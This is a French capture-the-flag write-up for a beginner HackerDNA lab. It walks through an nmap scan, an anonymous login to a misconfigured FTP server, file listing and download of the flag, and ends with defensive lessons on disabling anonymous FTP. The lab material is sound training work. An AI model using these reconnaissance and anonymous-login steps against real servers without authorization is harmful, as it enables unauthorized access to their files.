# Compte rendu : Anonymous
Plateforme : HackerDNA ( https://hackerdna.com/labs/anonymous )
Auteur : SRH
Catégorie : Network & Infrastructure
Difficulté : Facile
Tags : FTP, Anonymous Login, Reconnaissance
XP : +100 XP

## Scénario
Se connecter à un serveur de fichiers en tant qu'invité et récupérer ce qui s'y trouve.

Objectif : exploiter une mauvaise configuration FTP qui permet une connexion anonyme pour récupérer le flag caché.

Prérequis : Nmap, FTP.

## Chaîne d'Attaque
[Scan Nmap] → [Port 21 / FTP détecté] → [Connexion anonymous] → [Énumération des fichiers] → [Téléchargement du flag] → 🚩

## Étape 1 — Reconnaissance
Scan des ports et services :

```bash
nmap -sV -sC [IP_CIBLE]
```

Résultat attendu :

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
```

Le port `21/tcp` est ouvert et expose un service FTP.

## Étape 2 — Analyse du risque FTP
FTP est un protocole de transfert de fichiers qui, par défaut, envoie les identifiants en clair.

Une mauvaise configuration courante permet la connexion anonyme :
- Nom d'utilisateur : `anonymous`
- Mot de passe : vide ou une adresse e-mail quelconque

Cela donne accès aux fichiers publics du serveur, qui contiennent parfois des fichiers sensibles.

## Étape 3 — Exploitation : Connexion anonyme
Connexion au service FTP :

```bash
ftp [IP_CIBLE]
```

Identifiants utilisés :

```
Name : anonymous
Password : (vide - Entrée)
```

Message de confirmation :

```
230 Login successful.
```

## Étape 4 — Énumération des fichiers
Listage des fichiers disponibles :

```bash
ls -la
pwd
```

## Étape 5 — Récupération du flag
Téléchargement du fichier contenant le flag :

```bash
get flag.txt
```

Ou en mode binaire si nécessaire :

```bash
binary
get flag.txt
```

Lecture en local :

```bash
cat flag.txt
```

🚩 Flag : FLAG{...}

## Conclusion
Ce lab illustre une mauvaise configuration classique :
- Un serveur FTP ne doit jamais autoriser la connexion anonyme sur des fichiers sensibles.
- Le scan Nmap permet de détecter rapidement le service.
- La connexion `anonymous` est toujours l'un des premiers tests à effectuer sur un port 21 ouvert.

## Leçons Apprises
1. Toujours tester la connexion anonyme sur un FTP.
2. Un port 21 ouvert = vérification immédiate de la configuration.
3. Ne jamais exposer de fichiers sensibles via FTP anonyme.
4. Préférer SFTP / FTPS avec authentification forte.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
